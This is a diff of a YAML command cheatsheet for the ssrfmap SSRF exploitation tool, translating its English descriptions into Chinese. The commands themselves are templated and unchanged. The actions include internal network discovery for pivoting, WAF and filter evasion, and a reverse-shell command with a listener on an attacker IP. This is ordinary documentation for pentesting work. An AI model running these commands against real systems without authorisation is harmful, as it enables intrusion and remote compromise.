@@ -4,62 +4,55 @@ tags: [security, pentest, ssrf, web, exploitation, enumeration, network]
 actions:
   # === RECONNAISSANCE AND ENUMERATION ===
 
-  - title: ssrfmap - basic module scan
+  - title: ssrfmap - 基础模块扫描
     desc: |
-      Perform a basic scan using specific modules against a target parameter in a request file. 
-      This is the primary way to use the tool, where you provide a raw HTTP request saved in a file and identify the injectable parameter.
-      The tool will then iterate through the selected modules to find vulnerabilities like port scanning or cloud metadata access.
-      Always ensure the request file reflects a valid HTTP request where the SSRF is suspected.
+      对请求文件中的目标参数执行基础模块扫描。这是该工具的主要使用方式，需要提供保存在文件中的原始 HTTP 请求并指定可注入的参数。
+      工具随后会遍历所选模块，探测端口扫描或云元数据访问等漏洞。
+      请始终确保请求文件反映的是存在 SSRF 嫌疑的有效 HTTP 请求。
     command: "ssrfmap -r {{request_file}} -p {{parameter}} -m {{modules|all}}"
 
-  - title: ssrfmap - internal network discovery
+  - title: ssrfmap - 内网发现
     desc: |
-      Use the network module to discover accessible internal IP addresses and services. 
-      By providing an internal IP range or specific target via the lhost flag, the tool attempts to map the internal perimeter from the server's perspective.
-      This is crucial for pivoting and identifying databases or admin panels not exposed to the internet.
-      Note that this can be noisy and might trigger internal intrusion detection systems.
+      使用 network 模块发现可访问的内网 IP 地址与服务。通过 lhost 参数提供内网 IP 范围或具体目标，工具会从服务器视角尝试测绘内网边界。
+      这对于横向移动以及发现未暴露到互联网的数据库或管理面板至关重要。
+      注意该操作可能产生大量噪声，并可能触发内网入侵检测系统。
     command: "ssrfmap -r {{request_file}} -p {{parameter}} -m network --lhost {{internal_target_ip}}"
 
-  - title: ssrfmap - increase testing intensity
+  - title: ssrfmap - 提高测试强度
     desc: |
-      Increase the testing level to perform more comprehensive and aggressive SSRF probes.
-      The level argument (ranging from 1 to 5) determines the complexity and quantity of the payloads sent to the target.
-      Higher levels are useful when simple filters are in place but may significantly increase the number of requests sent to the server.
-      Use level 1 for quick checks and higher levels if initial results are inconclusive.
+      提高测试等级，以执行更全面、更激进的 SSRF 探测。level 参数（1 到 5）决定发送到目标的 payload 的复杂度与数量。
+      当存在简单过滤器时更高级别很有用，但会显著增加发往服务器的请求数量。
+      快速检查用 level 1，若初步结果不明确则使用更高级别。
     command: "ssrfmap -r {{request_file}} -p {{parameter}} -m {{modules|all}} --level {{level|3}}"
 
   # === EXPLOITATION ===
 
-  - title: ssrfmap - reverse shell with handler
+  - title: ssrfmap - 带监听器的反弹 Shell
     desc: |
-      Attempt to gain a reverse shell by using an exploit module and starting a local handler.
-      The -l flag initiates a listener on the attacker's machine to catch the incoming connection from the target.
-      You must specify the attacker's IP (lhost) and the desired port (lport) for the connection to be established successfully.
-      This action usually requires a specific module that supports remote code execution or file inclusion via SSRF.
+      使用利用模块并启动本地监听器，尝试获取反弹 Shell。-l 参数会在攻击者机器上启动监听器以接收来自目标的连接。
+      你必须指定攻击者 IP（lhost）和期望端口（lport）才能成功建立连接。
+      该操作通常需要一个支持通过 SSRF 进行远程代码执行或文件包含的特定模块。
     command: "ssrfmap -r {{request_file}} -p {{parameter}} -m {{exploit_module}} -l {{handler_port|4444}} --lhost {{attacker_ip}} --lport {{attacker_port|4444}}"
 
   # === ADVANCED CONFIGURATION ===
 
-  - title: ssrfmap - proxy integration for debugging
+  - title: ssrfmap - 集成代理用于调试
     desc: |
-      Route all outbound traffic from ssrfmap through a specified HTTP/S proxy like Burp Suite.
-      This allows you to intercept, inspect, and manually modify the payloads being sent by the tool to the target.
-      It is an essential technique for debugging why a specific module might be failing or for bypassing complex WAF rules.
-      Ensure the proxy address and port match your local intercepting proxy settings.
+      将 ssrfmap 的所有出站流量路由到指定的 HTTP/S 代理（如 Burp Suite）。这使你能够拦截、检查并手动修改工具发送到目标的 payload。
+      对于调试特定模块为何失败或绕过复杂 WAF 规则，这是必不可少的技巧。
+      请确保代理地址和端口与本地拦截代理设置一致。
     command: "ssrfmap -r {{request_file}} -p {{parameter}} -m {{modules|all}} --proxy {{proxy_url|http://127.0.0.1:8080}}"
 
-  - title: ssrfmap - bypass filters with custom user-agent and SSL
+  - title: ssrfmap - 自定义 User-Agent 与 SSL 绕过过滤器
     desc: |
-      Enable SSL support and use a custom User-Agent string to bypass basic security filters or WAFs.
-      The --ssl flag allows the tool to communicate with HTTPS endpoints even if the certificates are self-signed or invalid.
-      Setting a custom User-Agent helps the tool's traffic blend in with regular browser traffic, reducing the chance of being blocked.
-      This is particularly useful when targeting enterprise environments with strict header inspection.
+      启用 SSL 支持并使用自定义 User-Agent 字符串，以绕过基础安全过滤器或 WAF。--ssl 参数允许工具与 HTTPS 端点通信，即使证书是自签名或无效的。
+      设置自定义 User-Agent 有助于让工具流量混入普通浏览器流量，降低被拦截的几率。
+      在针对具有严格请求头检查的企业环境时尤为有用。
     command: "ssrfmap -r {{request_file}} -p {{parameter}} -m {{modules|all}} --ssl --uagent \"{{user_agent|Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36}}\""
 
-  - title: ssrfmap - verbose output for troubleshooting
+  - title: ssrfmap - 详细输出用于排查
     desc: |
-      Enable verbose mode to see detailed information about the requests and responses during the scanning process.
-      Verbosity is highly recommended when a module is not returning expected results or when you need to see the exact payloads being generated.
-      It provides insights into timeouts, connection errors, and the logic being applied by the tool's modules.
-      Use this during the initial phases of an assessment to ensure the tool is configured correctly.
+      启用详细模式，查看扫描过程中的请求与响应详情。当某个模块未返回预期结果，或需要查看生成的确切 payload 时，强烈建议开启详细输出。
+      它可以提供超时、连接错误以及模块所应用逻辑的洞察。
+      在评估初期使用，以确保工具配置正确。
     command: "ssrfmap -r {{request_file}} -p {{parameter}} -m {{modules|all}} -v"
